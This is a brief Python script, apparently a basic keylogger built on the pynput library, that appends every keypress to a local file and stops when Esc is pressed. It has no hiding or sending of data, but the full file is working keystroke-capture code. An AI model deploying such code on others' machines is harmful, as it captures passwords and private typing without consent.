from pynput.keyboard import Listener, Key

# Path to the file where keystrokes will be logged
log_file = "key_log.txt"

def on_press(key):
    try:
        # Log the key pressed
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        with open(log_file, "a") as f:
            f.write(f"{key}")

def on_release(key):
    # Stop listener if the 'esc' key is pressed
    if key == Key.esc:
        return False

# Start listening to keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
